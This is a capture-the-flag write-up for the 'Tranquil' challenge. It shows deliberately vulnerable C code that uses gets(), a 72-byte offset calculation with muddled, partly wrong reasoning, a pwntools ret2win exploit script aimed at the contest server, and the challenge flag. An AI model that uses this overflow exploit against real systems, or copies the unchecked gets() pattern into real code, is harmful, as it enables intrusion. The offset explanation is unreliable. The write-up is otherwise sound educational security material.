
# Tranquil

Source code:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int win(){
    char flag[128];

    FILE *file = fopen("flag.txt","r");

    if (!file) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }

    fgets(flag, 128, file);

    puts(flag);
}

int vuln(){
    char password[64];

    puts("Enter the secret word: ");

    gets(&password);


    if(strcmp(password, "password123") == 0){
        puts("Logged in! The flag is somewhere else though...");
    } else {
        puts("Login failed!");
    }

    return 0;
}


int main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    vuln();

    // not so easy for you!
    // win();

    return 0;
}

```

Connect with ```nc shell.actf.co 21830``` or find it on the shell server at ```/problems/2021/tranquil```

* Hint: ```The compiler gives me a warning about gets... I wonder why.```

stacksize for vuln function is 0x40, and that for win is 0x90.. Return address rax is stored into rbp-0x8.
Hence required buffer size is: 0x90-0x40-0x8 = 72 bytes followed by address of win() function. 

# Solution

* Python code:
```
from pwn import *
r = remote('shell.actf.co', 21830)
r.recv()
r.sendline('A'*72 + p32(0x0000000000401196))
r.interactive()
```

# Flag
```actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}```

